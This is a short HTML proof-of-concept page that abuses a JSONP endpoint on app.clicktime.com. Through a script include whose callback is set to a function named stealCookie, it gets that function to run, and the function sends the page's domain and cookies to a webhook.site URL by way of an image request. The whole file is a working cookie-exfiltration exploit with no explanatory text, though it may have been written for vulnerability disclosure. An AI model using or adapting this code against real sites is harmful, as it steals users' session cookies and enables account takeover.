<html>

    <script>
      function stealCookie() {
        // Send domain and cookie info to webhook
        var img = new Image();
        var data = encodeURIComponent("domain=" + document.domain + "&cookie=" + document.cookie);
        img.src = "https://webhook.site/a4b4e5e2-6118-4cc2-b6ef-7916545a6478?data=" + data;

        alert("Cookie and domain sent:\nDomain: " + document.domain + "\nCookie: " + document.cookie);
      }
    </script>
    <script src="https://app.clicktime.com/API/Public/Login/HasCustomSAML/awx?callback=stealCookie"></script>
  </body>
